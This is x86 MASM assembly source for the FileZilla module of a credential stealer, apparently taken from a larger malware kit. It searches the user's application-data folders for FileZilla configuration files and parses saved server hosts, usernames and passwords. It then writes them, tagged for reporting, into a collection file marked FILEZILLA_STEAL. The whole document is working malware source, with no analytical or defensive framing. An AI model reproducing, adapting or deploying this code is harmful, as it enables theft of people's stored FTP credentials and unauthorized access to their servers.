     
.data?
      FZ_AppData      db 100h dup (?)
      Host            db 100h dup (?)
      User            db 100h dup (?)
      Pass            db 100h dup (?)
     
.code

FZRecCallback proc lpPath:DWORD, lpFilename:DWORD
      lstrcmp, addr fz_file1, lpFilename
      .if     eax != 0
              lstrcmp, addr fz_file2, lpFilename
              .if     eax == 0
                      jmp     fxp_good_file
              .endif
      .else
              jmp     fxp_good_file
      .endif
      jmp     fxp_mapping_error
    fxp_good_file:
      push    lpPath
      call    _PathFindFileName
      mov     byte ptr [eax], 0
      lstrcat, lpPath, lpFilename
      
      push    dword ptr [lpPath]
      call    DecryptFileZilla
      
    fxp_mapping_error:
      ret
FZRecCallback endp

DecryptFileZilla proc lpPath:DWORD
      LOCAL   FZ_hFile :DWORD
      LOCAL   hSize    :DWORD
      LOCAL   hMem     :DWORD
      LOCAL   nr       :DWORD
      LOCAL   p1       :DWORD
      LOCAL   pbegin   :DWORD
      LOCAL   pend     :DWORD
      LOCAL   gbegin   :DWORD
      
      CreateFile, lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
      cmp     eax, INVALID_HANDLE_VALUE
      je      fz_shit_bricks
      mov     FZ_hFile, eax
      GetFileSize, FZ_hFile, 0
      test    eax, eax
      je      fz_ZeroSize
      add     eax, 1
      mov     hSize, eax
      VirtualAlloc, 0, hSize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
      test    eax, eax
      je      fz_ZeroSize
      mov     hMem, eax
      SetFilePointer, FZ_hFile, 0, 0, FILE_BEGIN
      .if     eax == INVALID_SET_FILE_POINTER
              jmp     fz_read_shit
      .endif
      ReadFile, FZ_hFile, hMem, hSize, addr nr, NULL
      .if     eax == 0
              jmp     fz_read_shit
      .endif
      
      xor     ebx, ebx
    fz_parse_lp:
      mov     ecx, dword ptr [hMem]
      add     ecx, ebx
      mov     dword ptr [p1], ecx
      lstrlen, p1
      push    eax
      lstrlen, addr fzserver1
      push    eax
      push    dword ptr [p1]
      push    offset fzserver1
      call    strpos
      test    eax, eax
      je      no_pwds_here
      mov     dword ptr [pbegin], eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr fzserver2
      push    eax
      push    dword ptr [pbegin]
      push    offset fzserver2
      call    strpos
      test    eax, eax
      je      no_pwds_here
      mov     dword ptr [pend], eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr fzserver3
      push    eax
      push    dword ptr [pbegin]
      push    offset fzserver3
      call    strpos
      test    eax, eax
      je      skip_current_server
      
      add     eax, sizeof fzserver3-1
      mov     dword ptr [gbegin], eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr fzserver4
      push    eax
      push    dword ptr [pbegin]
      push    offset fzserver4
      call    strpos
      test    eax, eax
      je      skip_current_server
      
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr Host, gbegin, eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr fzserver5
      push    eax
      push    dword ptr [pbegin]
      push    offset fzserver5
      call    strpos
      test    eax, eax
      je      skip_current_server
      
      add     eax, sizeof fzserver5-1
      mov     dword ptr [gbegin], eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr fzserver6
      push    eax
      push    dword ptr [pbegin]
      push    offset fzserver6
      call    strpos
      test    eax, eax
      je      skip_current_server
      
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr User, gbegin, eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr fzserver7
      push    eax
      push    dword ptr [pbegin]
      push    offset fzserver7
      call    strpos
      test    eax, eax
      je      skip_current_server
      
      add     eax, sizeof fzserver7-1
      mov     dword ptr [gbegin], eax
      
      lstrlen, pbegin
      push    eax
      lstrlen, addr fzserver8
      push    eax
      push    dword ptr [pbegin]
      push    offset fzserver8
      call    strpos
      test    eax, eax
      je      skip_current_server
      
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr Pass, gbegin, eax
      
      lstrlen, addr Host
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_HOST
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr Host, plen, addr SNW, NULL
      
      lstrlen, addr User
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr User, plen, addr SNW, NULL
      
      lstrlen, addr Pass
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr Pass, plen, addr SNW, NULL
      
    skip_current_server:
      mov     ebx, dword ptr [pend]
      sub     ebx, dword ptr [hMem]
      inc     ebx
      cmp     ebx, dword ptr [hSize]
      jle     fz_parse_lp
      
    no_pwds_here:
    fz_read_shit:
      VirtualFree, hMem, 0, MEM_RELEASE
    fz_ZeroSize:
      CloseHandle, FZ_hFile
    fz_shit_bricks:
      ret
DecryptFileZilla endp

GetFileZillaPwd proc
      LOCAL   WTF:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], FILEZILLA_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetFileZillaPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; appdata shit #1
      push    0
      push    CSIDL_APPDATA
      push    offset FZ_AppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset FZ_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr FZ_AppData, addr filezilla_path
      mov     recursive_index, 0
      push    offset FZRecCallback
      push    offset FZ_AppData
      call    SomeRecursiveFunc
      
      ; appdata shit #2
      push    0
      push    CSIDL_COMMON_APPDATA
      push    offset FZ_AppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset FZ_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr FZ_AppData, addr filezilla_path
      mov     recursive_index, 0
      push    offset FZRecCallback
      push    offset FZ_AppData
      call    SomeRecursiveFunc
      
      ; appdata shit #3
      push    0
      push    CSIDL_LOCAL_APPDATA
      push    offset FZ_AppData
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset FZ_AppData
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr FZ_AppData, addr filezilla_path
      mov     recursive_index, 0
      push    offset FZRecCallback
      push    offset FZ_AppData
      call    SomeRecursiveFunc
      
    GetFileZillaPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetFileZillaPwd endp
